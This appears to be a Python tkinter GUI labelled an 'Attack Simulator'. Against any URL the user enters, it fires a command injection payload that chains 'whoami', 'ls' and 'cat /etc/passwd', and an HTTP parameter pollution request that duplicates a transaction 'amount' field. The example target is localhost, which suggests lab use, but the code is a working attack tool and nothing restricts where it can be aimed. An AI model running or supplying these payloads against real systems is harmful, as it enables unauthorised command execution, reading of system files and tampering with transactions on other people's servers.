import tkinter as tk
from tkinter import messagebox, scrolledtext
import requests


def perform_attack(attack_type):
    """
    Perform the selected attack type (Command Injection or HPP) on the given URL.
    """
    url = url_entry.get()
    if not url:
        messagebox.showerror("Error", "Please enter a URL!")
        return

    try:
        if attack_type == "Command Injection":
            # Command Injection Payload
            payload = "whoami; ls; cat /etc/passwd"
            response = requests.get(url, params={"cmd": payload})
            if response.status_code == 200:
                result_text.insert(tk.END, f"[Command Injection Success]\n{response.text}\n\n")
            else:
                result_text.insert(tk.END, f"[Command Injection Failed] Status Code: {response.status_code}\n\n")

        elif attack_type == "HPP":
            # HTTP Parameter Pollution Payload
            params = [("account", "12345"), ("amount", "100"), ("amount", "1000")]
            response = requests.post(url, data=params)
            if response.status_code == 200:
                result_text.insert(tk.END, f"[HPP Success]\n{response.text}\n\n")
            else:
                result_text.insert(tk.END, f"[HPP Failed] Status Code: {response.status_code}\n\n")

    except Exception as e:
        result_text.insert(tk.END, f"[{attack_type} Error] {str(e)}\n\n")


# Create the GUI
app = tk.Tk()
app.title("Attack Simulator: Command Injection & HPP")

# URL Input
url_label = tk.Label(app, text="Target URL (e.g., http://127.0.0.1:5000/attack):")
url_label.pack(pady=5)
url_entry = tk.Entry(app, width=50)
url_entry.pack(pady=5)

# Buttons for Attacks
command_injection_button = tk.Button(app, text="Command Injection", command=lambda: perform_attack("Command Injection"))
command_injection_button.pack(pady=5)

hpp_button = tk.Button(app, text="HTTP Parameter Pollution", command=lambda: perform_attack("HPP"))
hpp_button.pack(pady=5)

# Result Display
result_label = tk.Label(app, text="Attack Results:")
result_label.pack(pady=5)
result_text = scrolledtext.ScrolledText(app, width=60, height=20)
result_text.pack(pady=5)

# Run the GUI
app.mainloop()